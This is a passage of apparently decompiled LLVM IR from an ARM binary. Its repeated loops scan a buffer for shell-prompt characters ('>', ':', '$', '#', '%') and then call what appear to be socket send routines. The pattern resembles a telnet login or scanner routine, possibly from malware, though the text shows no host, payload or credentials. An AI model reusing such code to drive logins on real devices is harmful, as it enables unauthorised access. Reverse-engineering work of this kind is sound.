  store i1 %v2_10ed8, i1* %cpsr_c.global-to-local, align 1
  %v7_10ed8 = icmp eq i32 %v4_10ed4, -1
  store i1 %v7_10ed8, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_11770 = call i32 @function_11b48(i32 26)
  br i1 %v7_10ed8, label %dec_label_pc_1176c, label %dec_label_pc_10ee0

dec_label_pc_10ee0:                               ; preds = %dec_label_pc_10ea8
  store i32 %v1_11770, i32* %r0.global-to-local, align 4
  %v0_10ee8 = load i32, i32* @r6, align 4
  %v1_10ee8 = add i32 %v0_10ee8, 4
  %v2_10ee8 = inttoptr i32 %v1_10ee8 to i32*
  %v3_10ee8 = load i32, i32* %v2_10ee8, align 4
  store i32 %v3_10ee8, i32* %r0.global-to-local, align 4
  %v1_10eec = call i32 @function_1314c(i32 %v3_10ee8)
  store i32 %v1_10eec, i32* %r0.global-to-local, align 4
  %v0_10ef0 = load i32, i32* @r6, align 4
  %v1_10ef0 = add i32 %v0_10ef0, 284
  %v2_10ef0 = inttoptr i32 %v1_10ef0 to i8*
  %v3_10ef0 = load i8, i8* %v2_10ef0, align 1
  %v4_10ef0 = zext i8 %v3_10ef0 to i32
  %v1_10ef4 = add nuw nsw i32 %v4_10ef0, 1
  %v1_10ef8 = urem i32 %v1_10ef4, 256
  store i32 %v1_10ef8, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10f00 = icmp ugt i32 %v1_10ef8, 9
  store i1 %v2_10f00, i1* %cpsr_c.global-to-local, align 1
  %v7_10f00 = icmp eq i32 %v1_10ef8, 10
  store i1 %v7_10f00, i1* %cpsr_z.global-to-local, align 1
  %v2_10f04 = add i32 %v0_10ef0, 4
  %v3_10f04 = inttoptr i32 %v2_10f04 to i32*
  store i32 -1, i32* %v3_10f04, align 4
  %v0_10f08 = load i32, i32* @r3, align 4
  %v1_10f08 = trunc i32 %v0_10f08 to i8
  %v2_10f08 = load i32, i32* @r6, align 4
  %v3_10f08 = add i32 %v2_10f08, 284
  %v4_10f08 = inttoptr i32 %v3_10f08 to i8*
  store i8 %v1_10f08, i8* %v4_10f08, align 1
  %v0_10f0c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10f0c, label %dec_label_pc_10f10, label %dec_label_pc_118a4

dec_label_pc_10f10:                               ; preds = %dec_label_pc_10ee0
  store i32 0, i32* @r3, align 4
  %v1_10f14 = load i32, i32* @r6, align 4
  %v2_10f14 = add i32 %v1_10f14, 12
  %v3_10f14 = inttoptr i32 %v2_10f14 to i32*
  store i32 0, i32* %v3_10f14, align 4
  %v0_10f18 = load i32, i32* @r3, align 4
  %v1_10f18 = trunc i32 %v0_10f18 to i8
  %v2_10f18 = load i32, i32* @r6, align 4
  %v3_10f18 = add i32 %v2_10f18, 284
  %v4_10f18 = inttoptr i32 %v3_10f18 to i8*
  store i8 %v1_10f18, i8* %v4_10f18, align 1
  br label %dec_label_pc_10f1c

dec_label_pc_10f1c:                               ; preds = %dec_label_pc_118a4, %dec_label_pc_10f10
  store i32 -1, i32* @r8, align 4
  br label %dec_label_pc_10f20

dec_label_pc_10f20:                               ; preds = %dec_label_pc_11510, %dec_label_pc_11418, %dec_label_pc_11344, %dec_label_pc_11270, %dec_label_pc_11098, %dec_label_pc_10fc4, %dec_label_pc_10f1c
  %v0_10f20 = load i32, i32* @r6, align 4
  %v1_10f20 = add i32 %v0_10f20, 24
  %v2_10f20 = inttoptr i32 %v1_10f20 to i32*
  %v3_10f20 = load i32, i32* %v2_10f20, align 4
  %v0_10f24 = load i32, i32* @r8, align 4
  %v2_10f24 = sub i32 %v0_10f24, %v3_10f20
  %v3_10f24 = icmp uge i32 %v0_10f24, %v3_10f20
  store i1 %v3_10f24, i1* %cpsr_c.global-to-local, align 1
  %v4_10f24 = xor i32 %v0_10f24, %v3_10f20
  %v5_10f24 = xor i32 %v2_10f24, %v0_10f24
  %v6_10f24 = and i32 %v5_10f24, %v4_10f24
  %v7_10f24 = icmp slt i32 %v6_10f24, 0
  %v8_10f24 = icmp slt i32 %v2_10f24, 0
  %v9_10f24 = icmp eq i32 %v0_10f24, %v3_10f20
  store i1 %v9_10f24, i1* %cpsr_z.global-to-local, align 1
  %v2_10f28 = xor i1 %v8_10f24, %v7_10f24
  %v0_10f24.v3_10f20 = select i1 %v2_10f28, i32 %v0_10f24, i32 %v3_10f20
  store i32 %v0_10f24.v3_10f20, i32* %r1.global-to-local, align 4
  %v2_10f30 = sub i32 %v3_10f20, %v0_10f24.v3_10f20
  store i32 %v2_10f30, i32* @r2, align 4
  store i32 %v2_10f30, i32* %v2_10f20, align 4
  %v0_10f38 = load i32, i32* @fp, align 4
  %v1_10f38 = load i32, i32* %r1.global-to-local, align 4
  %v2_10f38 = add i32 %v1_10f38, %v0_10f38
  store i32 %v2_10f38, i32* @r1, align 4
  store i32 %v0_10f38, i32* @r0, align 4
  %v3_10f40 = call i32 @function_13670(i32 %v0_10f38, i32 %v2_10f38, i32 %v2_10f30)
  store i32 %v3_10f40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10e04

dec_label_pc_10f48:                               ; preds = %dec_label_pc_10e04
  %v1_10f48 = add i32 %v0_10e04, 24
  %v2_10f48 = inttoptr i32 %v1_10f48 to i32*
  %v3_10f48 = load i32, i32* %v2_10f48, align 4
  store i32 %v3_10f48, i32* %r2.global-to-local, align 4
  %v1_10f4c = add i32 %v3_10f48, -1
  store i32 %v1_10f4c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10f50 = icmp eq i32 %v1_10f4c, 0
  store i1 %v2_10f50, i1* %cpsr_z.global-to-local, align 1
  %tmp384 = icmp slt i32 %v1_10f4c, 1
  br i1 %tmp384, label %dec_label_pc_10d84thread-pre-split.thread, label %dec_label_pc_10f58

dec_label_pc_10f58:                               ; preds = %dec_label_pc_10f48
  %v2_10f58 = add i32 %v1_10f4c, %v0_10e04
  store i32 %v2_10f58, i32* %r3.global-to-local, align 4
  %v1_10f5c = add i32 %v2_10f58, 28
  %v2_10f5c = inttoptr i32 %v1_10f5c to i8*
  %v3_10f5c = load i8, i8* %v2_10f5c, align 1
  %v4_10f5c = zext i8 %v3_10f5c to i32
  store i32 %v4_10f5c, i32* %r3.global-to-local, align 4
  %v2_10f60 = icmp ugt i8 %v3_10f5c, 61
  store i1 %v2_10f60, i1* %cpsr_c.global-to-local, align 1
  %v7_10f60 = icmp eq i8 %v3_10f5c, 62
  store i1 %v7_10f60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f60, label %dec_label_pc_10fc4, label %bb385

bb385:                                            ; preds = %dec_label_pc_10f58
  %v3_10f64 = icmp ugt i8 %v3_10f5c, 57
  store i1 %v3_10f64, i1* %cpsr_c.global-to-local, align 1
  %v8_10f64 = icmp eq i8 %v3_10f5c, 58
  store i1 %v8_10f64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10f64, label %dec_label_pc_10fc4, label %dec_label_pc_10f6c

dec_label_pc_10f6c:                               ; preds = %bb385
  %v2_10f6c = icmp ugt i8 %v3_10f5c, 35
  store i1 %v2_10f6c, i1* %cpsr_c.global-to-local, align 1
  %v7_10f6c = icmp eq i8 %v3_10f5c, 36
  store i1 %v7_10f6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f6c, label %dec_label_pc_10fc4, label %dec_label_pc_10f74

dec_label_pc_10f74:                               ; preds = %dec_label_pc_10f6c
  %v2_10f74 = icmp ugt i8 %v3_10f5c, 34
  store i1 %v2_10f74, i1* %cpsr_c.global-to-local, align 1
  %v7_10f74 = icmp eq i8 %v3_10f5c, 35
  store i1 %v7_10f74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f74, label %dec_label_pc_10fc4, label %dec_label_pc_10f7c

dec_label_pc_10f7c:                               ; preds = %dec_label_pc_10f74
  %v2_10f7c = icmp ugt i8 %v3_10f5c, 36
  store i1 %v2_10f7c, i1* %cpsr_c.global-to-local, align 1
  %v7_10f7c = icmp eq i8 %v3_10f5c, 37
  store i1 %v7_10f7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f7c, label %dec_label_pc_10fc4, label %dec_label_pc_10fac.preheader

dec_label_pc_10fac.preheader:                     ; preds = %dec_label_pc_10f7c
  %v3_10f80 = add i32 %v0_10e04, 28
  %v2_10f84 = add i32 %v3_10f80, %v3_10f48
  store i32 %v2_10f84, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10fac

dec_label_pc_10f90:                               ; preds = %bb386
  %v2_10f90 = icmp ugt i8 %v3_10fb4, 35
  store i1 %v2_10f90, i1* %cpsr_c.global-to-local, align 1
  %v7_10f90 = icmp eq i8 %v3_10fb4, 36
  store i1 %v7_10f90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f90, label %dec_label_pc_10fc4, label %dec_label_pc_10f98

dec_label_pc_10f98:                               ; preds = %dec_label_pc_10f90
  %v2_10f98 = icmp ugt i8 %v3_10fb4, 34
  store i1 %v2_10f98, i1* %cpsr_c.global-to-local, align 1
  %v7_10f98 = icmp eq i8 %v3_10fb4, 35
  store i1 %v7_10f98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f98, label %dec_label_pc_10fc4, label %dec_label_pc_10fa0

dec_label_pc_10fa0:                               ; preds = %dec_label_pc_10f98
  %v2_10fa0 = icmp ugt i8 %v3_10fb4, 36
  store i1 %v2_10fa0, i1* %cpsr_c.global-to-local, align 1
  %v7_10fa0 = icmp eq i8 %v3_10fb4, 37
  store i1 %v7_10fa0, i1* %cpsr_z.global-to-local, align 1
  %v1_10fa4 = add i32 %v0_10fa4, -1
  store i32 %v1_10fa4, i32* %r3.global-to-local, align 4
  br i1 %v7_10fa0, label %dec_label_pc_10fc4, label %dec_label_pc_10fac

dec_label_pc_10fac:                               ; preds = %dec_label_pc_10fac.preheader, %dec_label_pc_10fa0
  %v0_10fa4 = phi i32 [ %v2_10f84, %dec_label_pc_10fac.preheader ], [ %v1_10fa4, %dec_label_pc_10fa0 ]
  %v0_10fac = phi i32 [ %v1_10f4c, %dec_label_pc_10fac.preheader ], [ %v1_10fac, %dec_label_pc_10fa0 ]
  %v1_10fac = add i32 %v0_10fac, -1
  store i32 %v1_10fac, i32* %r1.global-to-local, align 4
  %v2_10fac = icmp ne i32 %v0_10fac, 0
  store i1 %v2_10fac, i1* %cpsr_c.global-to-local, align 1
  %v7_10fac = icmp eq i32 %v0_10fac, 1
  store i1 %v7_10fac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fac, label %dec_label_pc_10d84thread-pre-split.thread512, label %dec_label_pc_10fb4

dec_label_pc_10fb4:                               ; preds = %dec_label_pc_10fac
  %v1_10fb4 = add i32 %v0_10fa4, -2
  %v2_10fb4 = inttoptr i32 %v1_10fb4 to i8*
  %v3_10fb4 = load i8, i8* %v2_10fb4, align 1
  %v4_10fb4 = zext i8 %v3_10fb4 to i32
  store i32 %v4_10fb4, i32* %r2.global-to-local, align 4
  %v2_10fb8 = icmp ugt i8 %v3_10fb4, 61
  store i1 %v2_10fb8, i1* %cpsr_c.global-to-local, align 1
  %v7_10fb8 = icmp eq i8 %v3_10fb4, 62
  store i1 %v7_10fb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fb8, label %dec_label_pc_10fc4, label %bb386

bb386:                                            ; preds = %dec_label_pc_10fb4
  %v3_10fbc = icmp ugt i8 %v3_10fb4, 57
  store i1 %v3_10fbc, i1* %cpsr_c.global-to-local, align 1
  %v8_10fbc = icmp eq i8 %v3_10fb4, 58
  store i1 %v8_10fbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10fbc, label %dec_label_pc_10fc4, label %dec_label_pc_10f90

dec_label_pc_10fc4:                               ; preds = %dec_label_pc_10fb4, %bb386, %dec_label_pc_10fa0, %dec_label_pc_10f98, %dec_label_pc_10f90, %dec_label_pc_10f7c, %dec_label_pc_10f58, %dec_label_pc_10f74, %dec_label_pc_10f6c, %bb385
  %v0_10fc8 = phi i32 [ %v1_10f4c, %dec_label_pc_10f7c ], [ %v1_10f4c, %dec_label_pc_10f58 ], [ %v1_10f4c, %dec_label_pc_10f74 ], [ %v1_10f4c, %dec_label_pc_10f6c ], [ %v1_10f4c, %bb385 ], [ %v1_10fac, %dec_label_pc_10f90 ], [ %v1_10fac, %dec_label_pc_10f98 ], [ %v1_10fac, %dec_label_pc_10fa0 ], [ %v1_10fac, %bb386 ], [ %v1_10fac, %dec_label_pc_10fb4 ]
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_10fc8 = add i32 %v0_10fc8, 1
  store i32 %v1_10fc8, i32* @r8, align 4
  %v1_10fcc = call i32 @function_11be8(i32 24)
  store i32 %v2_11428, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v3_10fdc = call i32 @function_11b24(i32 24, i32* nonnull %stack_var_-60)
  store i32 %v3_10fdc, i32* %r0.global-to-local, align 4
  %v3_10fe0 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10fe0, i32* %r2.global-to-local, align 4
  store i32 %v3_10fdc, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10fec = load i32, i32* @r6, align 4
  %v1_10fec = add i32 %v0_10fec, 4
  %v2_10fec = inttoptr i32 %v1_10fec to i32*
  %v3_10fec = load i32, i32* %v2_10fec, align 4
  store i32 %v3_10fec, i32* %r0.global-to-local, align 4
  %v4_10ff0 = call i32 @function_13884(i32 %v3_10fec, i32 %v3_10fdc, i32 %v3_10fe0, i32 16384)
  store i32 %v4_10ff0, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_11000 = load i32, i32* @r6, align 4
  %v1_11000 = add i32 %v0_11000, 4
  %v2_11000 = inttoptr i32 %v1_11000 to i32*
  %v3_11000 = load i32, i32* %v2_11000, align 4
  store i32 %v3_11000, i32* %r0.global-to-local, align 4
  %v4_11004 = call i32 @function_13884(i32 %v3_11000, i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32 2, i32 16384)
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_1100c = call i32 @function_11b48(i32 24)
  store i32 %v1_1100c, i32* %r0.global-to-local, align 4
  store i32 10, i32* @r3, align 4
  %v1_11014 = load i32, i32* @r6, align 4
  %v2_11014 = add i32 %v1_11014, 12
  %v3_11014 = inttoptr i32 %v2_11014 to i32*
  store i32 10, i32* %v3_11014, align 4
  br label %dec_label_pc_10f20

dec_label_pc_1101c:                               ; preds = %dec_label_pc_10e04
  %v1_1101c = add i32 %v0_10e04, 24
  %v2_1101c = inttoptr i32 %v1_1101c to i32*
  %v3_1101c = load i32, i32* %v2_1101c, align 4
  store i32 %v3_1101c, i32* %r2.global-to-local, align 4
  %v1_11020 = add i32 %v3_1101c, -1
  store i32 %v1_11020, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11024 = icmp eq i32 %v1_11020, 0
  store i1 %v2_11024, i1* %cpsr_z.global-to-local, align 1
  %tmp387 = icmp slt i32 %v1_11020, 1
  br i1 %tmp387, label %dec_label_pc_10d84thread-pre-split.thread, label %dec_label_pc_1102c

dec_label_pc_1102c:                               ; preds = %dec_label_pc_1101c
  %v2_1102c = add i32 %v1_11020, %v0_10e04
  store i32 %v2_1102c, i32* %r3.global-to-local, align 4
  %v1_11030 = add i32 %v2_1102c, 28
  %v2_11030 = inttoptr i32 %v1_11030 to i8*
  %v3_11030 = load i8, i8* %v2_11030, align 1
  %v4_11030 = zext i8 %v3_11030 to i32
  store i32 %v4_11030, i32* %r3.global-to-local, align 4
  %v2_11034 = icmp ugt i8 %v3_11030, 61
  store i1 %v2_11034, i1* %cpsr_c.global-to-local, align 1
  %v7_11034 = icmp eq i8 %v3_11030, 62
  store i1 %v7_11034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11034, label %dec_label_pc_11098, label %bb388

bb388:                                            ; preds = %dec_label_pc_1102c
  %v3_11038 = icmp ugt i8 %v3_11030, 57
  store i1 %v3_11038, i1* %cpsr_c.global-to-local, align 1
  %v8_11038 = icmp eq i8 %v3_11030, 58
  store i1 %v8_11038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11038, label %dec_label_pc_11098, label %dec_label_pc_11040

dec_label_pc_11040:                               ; preds = %bb388
  %v2_11040 = icmp ugt i8 %v3_11030, 35
  store i1 %v2_11040, i1* %cpsr_c.global-to-local, align 1
  %v7_11040 = icmp eq i8 %v3_11030, 36
  store i1 %v7_11040, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11040, label %dec_label_pc_11098, label %dec_label_pc_11048

dec_label_pc_11048:                               ; preds = %dec_label_pc_11040
  %v2_11048 = icmp ugt i8 %v3_11030, 34
  store i1 %v2_11048, i1* %cpsr_c.global-to-local, align 1
  %v7_11048 = icmp eq i8 %v3_11030, 35
  store i1 %v7_11048, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11048, label %dec_label_pc_11098, label %dec_label_pc_11050

dec_label_pc_11050:                               ; preds = %dec_label_pc_11048
  %v2_11050 = icmp ugt i8 %v3_11030, 36
  store i1 %v2_11050, i1* %cpsr_c.global-to-local, align 1
  %v7_11050 = icmp eq i8 %v3_11030, 37
  store i1 %v7_11050, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11050, label %dec_label_pc_11098, label %dec_label_pc_11080.preheader

dec_label_pc_11080.preheader:                     ; preds = %dec_label_pc_11050
  %v3_11054 = add i32 %v0_10e04, 28
  %v2_11058 = add i32 %v3_11054, %v3_1101c
  store i32 %v2_11058, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11080

dec_label_pc_11064:                               ; preds = %bb389
  %v2_11064 = icmp ugt i8 %v3_11088, 35
  store i1 %v2_11064, i1* %cpsr_c.global-to-local, align 1
  %v7_11064 = icmp eq i8 %v3_11088, 36
  store i1 %v7_11064, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11064, label %dec_label_pc_11098, label %dec_label_pc_1106c

dec_label_pc_1106c:                               ; preds = %dec_label_pc_11064
  %v2_1106c = icmp ugt i8 %v3_11088, 34
  store i1 %v2_1106c, i1* %cpsr_c.global-to-local, align 1
  %v7_1106c = icmp eq i8 %v3_11088, 35
  store i1 %v7_1106c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1106c, label %dec_label_pc_11098, label %dec_label_pc_11074

dec_label_pc_11074:                               ; preds = %dec_label_pc_1106c
  %v2_11074 = icmp ugt i8 %v3_11088, 36
  store i1 %v2_11074, i1* %cpsr_c.global-to-local, align 1
  %v7_11074 = icmp eq i8 %v3_11088, 37
  store i1 %v7_11074, i1* %cpsr_z.global-to-local, align 1
  %v1_11078 = add i32 %v0_11078, -1
  store i32 %v1_11078, i32* %r3.global-to-local, align 4
  br i1 %v7_11074, label %dec_label_pc_11098, label %dec_label_pc_11080

dec_label_pc_11080:                               ; preds = %dec_label_pc_11080.preheader, %dec_label_pc_11074
  %v0_11078 = phi i32 [ %v2_11058, %dec_label_pc_11080.preheader ], [ %v1_11078, %dec_label_pc_11074 ]
  %v0_11080 = phi i32 [ %v1_11020, %dec_label_pc_11080.preheader ], [ %v1_11080, %dec_label_pc_11074 ]
  %v1_11080 = add i32 %v0_11080, -1
  store i32 %v1_11080, i32* %r1.global-to-local, align 4
  %v2_11080 = icmp ne i32 %v0_11080, 0
  store i1 %v2_11080, i1* %cpsr_c.global-to-local, align 1
  %v7_11080 = icmp eq i32 %v0_11080, 1
  store i1 %v7_11080, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11080, label %dec_label_pc_10d84thread-pre-split.thread512, label %dec_label_pc_11088

dec_label_pc_11088:                               ; preds = %dec_label_pc_11080
  %v1_11088 = add i32 %v0_11078, -2
  %v2_11088 = inttoptr i32 %v1_11088 to i8*
  %v3_11088 = load i8, i8* %v2_11088, align 1
  %v4_11088 = zext i8 %v3_11088 to i32
  store i32 %v4_11088, i32* %r2.global-to-local, align 4
  %v2_1108c = icmp ugt i8 %v3_11088, 61
  store i1 %v2_1108c, i1* %cpsr_c.global-to-local, align 1
  %v7_1108c = icmp eq i8 %v3_11088, 62
  store i1 %v7_1108c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1108c, label %dec_label_pc_11098, label %bb389

bb389:                                            ; preds = %dec_label_pc_11088
  %v3_11090 = icmp ugt i8 %v3_11088, 57
  store i1 %v3_11090, i1* %cpsr_c.global-to-local, align 1
  %v8_11090 = icmp eq i8 %v3_11088, 58
  store i1 %v8_11090, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11090, label %dec_label_pc_11098, label %dec_label_pc_11064

dec_label_pc_11098:                               ; preds = %dec_label_pc_11088, %bb389, %dec_label_pc_11074, %dec_label_pc_1106c, %dec_label_pc_11064, %dec_label_pc_11050, %dec_label_pc_1102c, %dec_label_pc_11048, %dec_label_pc_11040, %bb388
  %v0_1109c = phi i32 [ %v1_11020, %dec_label_pc_11050 ], [ %v1_11020, %dec_label_pc_1102c ], [ %v1_11020, %dec_label_pc_11048 ], [ %v1_11020, %dec_label_pc_11040 ], [ %v1_11020, %bb388 ], [ %v1_11080, %dec_label_pc_11064 ], [ %v1_11080, %dec_label_pc_1106c ], [ %v1_11080, %dec_label_pc_11074 ], [ %v1_11080, %bb389 ], [ %v1_11080, %dec_label_pc_11088 ]
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_1109c = add i32 %v0_1109c, 1
  store i32 %v1_1109c, i32* @r8, align 4
  %v1_110a0 = call i32 @function_11be8(i32 20)
  store i32 %v2_11428, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r0.global-to-local, align 4
  %v3_110b0 = call i32 @function_11b24(i32 20, i32* nonnull %stack_var_-60)
  store i32 %v3_110b0, i32* %r0.global-to-local, align 4
  %v3_110b4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_110b4, i32* %r2.global-to-local, align 4
  store i32 %v3_110b0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_110c0 = load i32, i32* @r6, align 4
  %v1_110c0 = add i32 %v0_110c0, 4
  %v2_110c0 = inttoptr i32 %v1_110c0 to i32*
  %v3_110c0 = load i32, i32* %v2_110c0, align 4
  store i32 %v3_110c0, i32* %r0.global-to-local, align 4
  %v4_110c4 = call i32 @function_13884(i32 %v3_110c0, i32 %v3_110b0, i32 %v3_110b4, i32 16384)
  store i32 %v4_110c4, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_110d4 = load i32, i32* @r6, align 4
  %v1_110d4 = add i32 %v0_110d4, 4
  %v2_110d4 = inttoptr i32 %v1_110d4 to i32*
  %v3_110d4 = load i32, i32* %v2_110d4, align 4
  store i32 %v3_110d4, i32* %r0.global-to-local, align 4
  %v4_110d8 = call i32 @function_13884(i32 %v3_110d4, i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32 2, i32 16384)
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_110e0 = call i32 @function_11b48(i32 20)
  store i32 %v1_110e0, i32* %r0.global-to-local, align 4
  store i32 8, i32* @r3, align 4
  %v1_110e8 = load i32, i32* @r6, align 4
  %v2_110e8 = add i32 %v1_110e8, 12
  %v3_110e8 = inttoptr i32 %v2_110e8 to i32*
  store i32 8, i32* %v3_110e8, align 4
  br label %dec_label_pc_10f20

dec_label_pc_110f0:                               ; preds = %dec_label_pc_10e04
  %v1_110f0 = add i32 %v0_10e04, 24
  %v2_110f0 = inttoptr i32 %v1_110f0 to i32*
  %v3_110f0 = load i32, i32* %v2_110f0, align 4
  store i32 %v3_110f0, i32* %r2.global-to-local, align 4
  %v1_110f4 = add i32 %v3_110f0, -1
  store i32 %v1_110f4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_110f8 = icmp eq i32 %v1_110f4, 0
  store i1 %v2_110f8, i1* %cpsr_z.global-to-local, align 1
  %tmp390 = icmp slt i32 %v1_110f4, 1
  br i1 %tmp390, label %dec_label_pc_10d84thread-pre-split.thread, label %dec_label_pc_11100

dec_label_pc_11100:                               ; preds = %dec_label_pc_110f0
  %v2_11100 = add i32 %v1_110f4, %v0_10e04
  store i32 %v2_11100, i32* %r3.global-to-local, align 4
  %v1_11104 = add i32 %v2_11100, 28
  %v2_11104 = inttoptr i32 %v1_11104 to i8*
  %v3_11104 = load i8, i8* %v2_11104, align 1
  %v4_11104 = zext i8 %v3_11104 to i32
  store i32 %v4_11104, i32* %r3.global-to-local, align 4
  %v2_11108 = icmp ugt i8 %v3_11104, 61
  store i1 %v2_11108, i1* %cpsr_c.global-to-local, align 1
  %v7_11108 = icmp eq i8 %v3_11104, 62
  store i1 %v7_11108, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11108, label %dec_label_pc_11270, label %bb391

bb391:                                            ; preds = %dec_label_pc_11100
  %v3_1110c = icmp ugt i8 %v3_11104, 57
  store i1 %v3_1110c, i1* %cpsr_c.global-to-local, align 1
  %v8_1110c = icmp eq i8 %v3_11104, 58
  store i1 %v8_1110c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1110c, label %dec_label_pc_11270, label %dec_label_pc_11114

dec_label_pc_11114:                               ; preds = %bb391
  %v2_11114 = icmp ugt i8 %v3_11104, 35
  store i1 %v2_11114, i1* %cpsr_c.global-to-local, align 1
  %v7_11114 = icmp eq i8 %v3_11104, 36
  store i1 %v7_11114, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11114, label %dec_label_pc_11270, label %dec_label_pc_1111c

dec_label_pc_1111c:                               ; preds = %dec_label_pc_11114
  %v2_1111c = icmp ugt i8 %v3_11104, 34
  store i1 %v2_1111c, i1* %cpsr_c.global-to-local, align 1
  %v7_1111c = icmp eq i8 %v3_11104, 35
  store i1 %v7_1111c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1111c, label %dec_label_pc_11270, label %dec_label_pc_11124

dec_label_pc_11124:                               ; preds = %dec_label_pc_1111c
  %v2_11124 = icmp ugt i8 %v3_11104, 36
  store i1 %v2_11124, i1* %cpsr_c.global-to-local, align 1
  %v7_11124 = icmp eq i8 %v3_11104, 37
  store i1 %v7_11124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11124, label %dec_label_pc_11270, label %dec_label_pc_11258.preheader

dec_label_pc_11258.preheader:                     ; preds = %dec_label_pc_11124
  %v3_11128 = add i32 %v0_10e04, 28
  %v2_1112c = add i32 %v3_11128, %v3_110f0
  store i32 %v2_1112c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11258

dec_label_pc_1123c:                               ; preds = %bb392
  %v2_1123c = icmp ugt i8 %v3_11260, 35
  store i1 %v2_1123c, i1* %cpsr_c.global-to-local, align 1
  %v7_1123c = icmp eq i8 %v3_11260, 36
  store i1 %v7_1123c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1123c, label %dec_label_pc_11270, label %dec_label_pc_11244

dec_label_pc_11244:                               ; preds = %dec_label_pc_1123c
  %v2_11244 = icmp ugt i8 %v3_11260, 34
  store i1 %v2_11244, i1* %cpsr_c.global-to-local, align 1
  %v7_11244 = icmp eq i8 %v3_11260, 35
  store i1 %v7_11244, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11244, label %dec_label_pc_11270, label %dec_label_pc_1124c

dec_label_pc_1124c:                               ; preds = %dec_label_pc_11244
  %v2_1124c = icmp ugt i8 %v3_11260, 36
  store i1 %v2_1124c, i1* %cpsr_c.global-to-local, align 1
  %v7_1124c = icmp eq i8 %v3_11260, 37
  store i1 %v7_1124c, i1* %cpsr_z.global-to-local, align 1
  %v1_11250 = add i32 %v0_11250, -1
  store i32 %v1_11250, i32* %r3.global-to-local, align 4
  br i1 %v7_1124c, label %dec_label_pc_11270, label %dec_label_pc_11258

dec_label_pc_11258:                               ; preds = %dec_label_pc_11258.preheader, %dec_label_pc_1124c
  %v0_11250 = phi i32 [ %v2_1112c, %dec_label_pc_11258.preheader ], [ %v1_11250, %dec_label_pc_1124c ]
  %v0_11258 = phi i32 [ %v1_110f4, %dec_label_pc_11258.preheader ], [ %v1_11258, %dec_label_pc_1124c ]
  %v1_11258 = add i32 %v0_11258, -1
  store i32 %v1_11258, i32* %r1.global-to-local, align 4
  %v2_11258 = icmp ne i32 %v0_11258, 0
  store i1 %v2_11258, i1* %cpsr_c.global-to-local, align 1
  %v7_11258 = icmp eq i32 %v0_11258, 1
  store i1 %v7_11258, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11258, label %dec_label_pc_10d84thread-pre-split.thread512, label %dec_label_pc_11260

dec_label_pc_11260:                               ; preds = %dec_label_pc_11258
  %v1_11260 = add i32 %v0_11250, -2
  %v2_11260 = inttoptr i32 %v1_11260 to i8*
  %v3_11260 = load i8, i8* %v2_11260, align 1
  %v4_11260 = zext i8 %v3_11260 to i32
  store i32 %v4_11260, i32* %r2.global-to-local, align 4
  %v2_11264 = icmp ugt i8 %v3_11260, 61
  store i1 %v2_11264, i1* %cpsr_c.global-to-local, align 1
  %v7_11264 = icmp eq i8 %v3_11260, 62
  store i1 %v7_11264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11264, label %dec_label_pc_11270, label %bb392

